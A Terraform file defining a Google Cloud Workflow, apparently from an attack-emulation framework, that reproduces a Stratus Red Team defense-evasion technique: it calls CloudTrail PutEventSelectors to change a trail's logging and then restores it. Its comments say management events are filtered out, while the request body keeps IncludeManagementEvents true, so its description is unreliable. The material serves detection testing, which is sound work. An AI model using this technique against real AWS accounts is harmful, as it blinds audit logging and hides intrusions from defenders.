data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_cloudtrail_event_selector" {
  name            = "aws-cloudtrail-event-selector-srt"
  description     = "A workflow intended to match the functionality of the Status Red Team attack technique 'AWS Disable CloudTrail Logging Through Event Selectors': https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## Disrupt CloudTrail Logging by creating an event selector on the Trail, filtering out all management events.
## The logging of management plane events is restored by the DeRF Default User.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "Derf-AWS-Disable-CloudTrail-EventSelector-WORKFLOWEXECUTIONID"

######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - user: $${args.user}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  

    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - PutEventSelector:
        call: PutEventSelector
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: PutEventSelectorResponse
    - RevertPutEventSelector:
        call: RevertPutEventSelector
        args:
            appEndpoint: $${appEndpoint.uri}
        result: RevertPutEventSelectorResponse
    - return:
        return: 
          - $${PutEventSelectorResponse}
         


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
PutEventSelector:
  params: [user, appEndpoint]
  steps: 
    - PutEventSelector:
        try:
            steps:
                - callStep:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                        Content-Type: application/json
                      body:
                          HOST: cloudtrail.us-east-1.amazonaws.com
                          REGION: "us-east-1"
                          SERVICE: "cloudtrail" 
                          ENDPOINT: "https://cloudtrail.us-east-1.amazonaws.com"
                          BODY: '{"TrailName": "${var.TrailName}", "EventSelectors": [{"IncludeManagementEvents": true, "DataResources": [{"Type": "AWS::S3::Object", "Values": ["arn:aws:s3"]}, {"Type": "AWS::Lambda::Function", "Values": ["arn:aws:lambda"]}]}]}'
                          UA: '$${"Derf-AWS-Disable-CloudTrail-EventSelector=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-amz-json-1.1"
                          USER: $${user}
                          VERB: POST
                          TARGET: com.amazonaws.cloudtrail.v20131101.CloudTrail_20131101.PutEventSelectors
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 409}
                        raise: $${response}
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS Disable CloudTrail Logging Through Event Selectorsl Attack"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Disable CloudTrail Logging Through Event Selectors| This is typically a permission error"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Disable CloudTrail Logging Through Event Selectors Attack"            

RevertPutEventSelector:
  params: [appEndpoint]
  steps: 
    - RevertPutEventSelector:
        try:
            steps:
                - callStep:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                        Content-Type: application/json
                      body:
                          HOST: cloudtrail.us-east-1.amazonaws.com
                          REGION: "us-east-1"
                          SERVICE: "cloudtrail" 
                          ENDPOINT: "https://cloudtrail.us-east-1.amazonaws.com"
                          BODY: '{"TrailName": "${var.TrailName}", "EventSelectors": [{"IncludeManagementEvents": true}]}'
                          UA: '$${"Derf-AWS-Disable-CloudTrail-EventSelector=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-amz-json-1.1"
                          VERB: POST
                          TARGET: com.amazonaws.cloudtrail.v20131101.CloudTrail_20131101.PutEventSelectors
                    result: response

                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 409}
                        raise: $${response}
        retry:
            predicate: $${custom_predicate}
            max_retries: 8
            backoff:
                initial_delay: 1
                max_delay: 60
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS reverting event selectors on the trail - AWS Disable CloudTrail Logging Through Event Selectors Attack"
    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE reverting event selectors on the trail - AWS Disable CloudTrail Logging Through Event Selectors Attack | This is typically a permission error"
    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE reverting event selectors on the trail - AWS Disable CloudTrail Logging Through Event Selectors"  

custom_predicate:
  params: [response]
  steps:
    - what_to_repeat:
        switch:
          - condition: $${response.body.responseCode == 400}
            return: true
          - condition: $${response.body.responseCode == 409}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
    - otherwise:
        return: false

  EOF

}